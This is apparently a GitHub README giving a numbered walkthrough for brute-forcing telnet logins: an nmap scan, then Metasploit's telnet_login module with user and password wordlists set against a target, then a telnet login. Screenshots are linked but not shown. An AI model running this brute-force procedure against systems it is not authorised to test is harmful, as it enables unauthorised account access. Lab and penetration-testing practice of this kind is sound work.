# Port-23-telnet-Linux-telnet
1.nmap -sV <target>
![image](https://github.com/thanawut2903/Port-23-telnet-Linux-telnet/assets/159118913/dea1ef26-fa27-4457-b5ec-502aebd30d15)
2.msfconsole
3.msf 6 > search telnet
4.msf 6 > use auiliary/scanner/telnet/telnet_login
5.show options 
![image](https://github.com/thanawut2903/Port-23-telnet-Linux-telnet/assets/159118913/f26392b9-0330-4b89-b132-75e07ca75113)
6.msf 6 > set RHOST <target>
7.msf 6 > set user_file <path user.txt>
8.msf 6 > set pass_file <path password.txt>
9.msf 6 > set stop_on_success true
![image](https://github.com/thanawut2903/Port-23-telnet-Linux-telnet/assets/159118913/ebf68411-a4b7-4915-8029-b3334c4b66f9)
10. msf 6 > run
![image](https://github.com/thanawut2903/Port-23-telnet-Linux-telnet/assets/159118913/265bee3d-d499-4c4f-b132-d2b965dfe77a)
11.telnet <target>
![image](https://github.com/thanawut2903/Port-23-telnet-Linux-telnet/assets/159118913/9c38d3a8-1ef9-4560-a2d1-95fa6788b8e1)
